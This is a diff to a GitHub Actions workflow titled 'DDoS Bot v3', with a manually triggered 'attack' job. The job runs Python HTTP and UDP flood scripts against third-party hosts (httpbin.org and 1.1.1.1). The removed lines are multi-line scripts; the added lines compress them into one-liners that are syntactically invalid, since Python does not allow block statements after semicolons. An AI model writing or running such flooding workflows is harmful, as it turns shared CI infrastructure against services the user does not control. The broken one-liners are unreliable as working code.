@@ -1,4 +1,4 @@
-name: "DDoS Bot v2"
+name: "DDoS Bot v3"
 on: workflow_dispatch
 jobs:
   attack:
@@ -7,63 +7,6 @@ jobs:
       - name: Test Connection
         run: python3 -c "print('Testing 1.1.1.1:80'); import socket; s=socket.socket(); s.settimeout(2); s.connect(('1.1.1.1',80)); print('✅ Connected'); s.close()"
       - name: HTTP Flood Test
-        run: |
-          python3 << "EOF"
-import socket
-import threading
-import time
-
-print("🚀 Starting HTTP Flood Test")
-target = "httpbin.org"
-port = 80
-
-count = 0
-
-def attack():
-    global count
-    for i in range(10):
-        try:
-            s = socket.socket()
-            s.settimeout(1)
-            s.connect((target, port))
-            s.send(b'GET / HTTP/1.1\\r\\n\\r\\n')
-            s.close()
-            count += 1
-        except:
-            pass
-
-threads = []
-for i in range(5):
-    t = threading.Thread(target=attack)
-    t.start()
-    threads.append(t)
-
-for t in threads:
-    t.join()
-
-print(f"✅ HTTP Test Complete: {count} requests")
-EOF
+        run: python3 -c "import socket,threading,time;print('🚀 HTTP Flood Starting');t='httpbin.org';p=80;c=0;def a():global c;for i in range(10):try:s=socket.socket();s.settimeout(1);s.connect((t,p));s.send(b'GET /');s.close();c+=1;except:pass;ts=[threading.Thread(target=a) for _ in range(5)];[x.start() for x in ts];[x.join() for x in ts];print(f'✅ HTTP Complete: {c} requests')"
       - name: UDP Flood Test
-        run: |
-          python3 << "EOF"
-import socket
-import os
-import time
-
-print("📨 Starting UDP Flood Test")
-target = "1.1.1.1"
-port = 80
-
-count = 0
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-for i in range(20):
-    try:
-        sock.sendto(os.urandom(1024), (target, port))
-        count += 1
-    except:
-        pass
-
-sock.close()
-print(f"✅ UDP Test Complete: {count} packets")
-EOF
+        run: python3 -c "import socket,os;print('📨 UDP Flood Starting');t='1.1.1.1';p=80;c=0;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);for i in range(20):s.sendto(os.urandom(512),(t,p));c+=1;s.close();print(f'✅ UDP Complete: {c} packets')"
